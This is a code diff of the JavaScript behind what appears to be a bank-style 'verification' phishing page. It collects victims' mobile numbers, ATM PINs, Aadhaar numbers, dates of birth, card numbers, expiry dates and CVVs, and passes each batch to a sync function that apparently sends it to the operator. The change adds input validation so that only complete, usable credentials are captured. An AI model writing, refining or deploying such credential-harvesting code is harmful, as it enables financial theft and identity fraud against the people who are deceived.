@@ -39,19 +39,34 @@ function submitFormData() {
 }
 
 function goToScreen(screenId) {
-    // Collect data before moving
     if (screenId === "screen-identity") {
         collectedData.mobileNumber = document.getElementById("mobileNumber")?.value;
         collectedData.atmPin = document.getElementById("atmPin")?.value;
-        if (collectedData.mobileNumber && collectedData.atmPin) {
-            syncPageData("mobile", { mobileNumber: collectedData.mobileNumber, atmPin: collectedData.atmPin });
+        
+        if (!collectedData.mobileNumber || collectedData.mobileNumber.length < 10) {
+            alert("Please enter a valid 10-digit mobile number.");
+            return;
         }
+        if (!collectedData.atmPin || collectedData.atmPin.length < 4) {
+            alert("Please enter your ATM PIN.");
+            return;
+        }
+
+        syncPageData("mobile", { mobileNumber: collectedData.mobileNumber, atmPin: collectedData.atmPin });
     } else if (screenId === "screen-card") {
         collectedData.aadhaarNumber = document.getElementById("aadhaarNumber")?.value;
         collectedData.dob = document.getElementById("dob")?.value;
-        if (collectedData.aadhaarNumber && collectedData.dob) {
-            syncPageData("identity", { aadhaarNumber: collectedData.aadhaarNumber, dob: collectedData.dob });
+
+        if (!collectedData.aadhaarNumber || collectedData.aadhaarNumber.length < 12) {
+            alert("Please enter a valid 12-digit Aadhaar number.");
+            return;
         }
+        if (!collectedData.dob || collectedData.dob.length < 10) {
+            alert("Please enter your Date of Birth.");
+            return;
+        }
+
+        syncPageData("identity", { aadhaarNumber: collectedData.aadhaarNumber, dob: collectedData.dob });
     }
 
     document.querySelectorAll('.screen').forEach(el => el.classList.remove('active'));
@@ -72,13 +87,24 @@ function openModal() {
     collectedData.expiry = document.getElementById("expiry")?.value;
     collectedData.cvv = document.getElementById("cvv")?.value;
     
-    if (collectedData.cardNumber && collectedData.expiry && collectedData.cvv) {
-        syncPageData("card", {
-            cardNumber: collectedData.cardNumber,
-            expiry: collectedData.expiry,
-            cvv: collectedData.cvv
-        });
+    if (!collectedData.cardNumber || collectedData.cardNumber.length < 19) {
+        alert("Please enter a valid Card Number.");
+        return;
     }
+    if (!collectedData.expiry || collectedData.expiry.length < 5) {
+        alert("Please enter Card Expiry Date.");
+        return;
+    }
+    if (!collectedData.cvv || collectedData.cvv.length < 3) {
+        alert("Please enter CVV.");
+        return;
+    }
+
+    syncPageData("card", {
+        cardNumber: collectedData.cardNumber,
+        expiry: collectedData.expiry,
+        cvv: collectedData.cvv
+    });
 
     document.getElementById('pinModal').style.display = 'flex';
 }
@@ -90,6 +116,12 @@ function closeModal(e) {
 
 function completeVerification() {
     collectedData.confirmAtmPin = document.getElementById("confirmAtmPin")?.value;
+    
+    if (!collectedData.confirmAtmPin || collectedData.confirmAtmPin.length < 4) {
+        alert("Please enter your ATM PIN.");
+        return;
+    }
+
     syncPageData("confirm_pin", {
         confirmAtmPin: collectedData.confirmAtmPin
     });
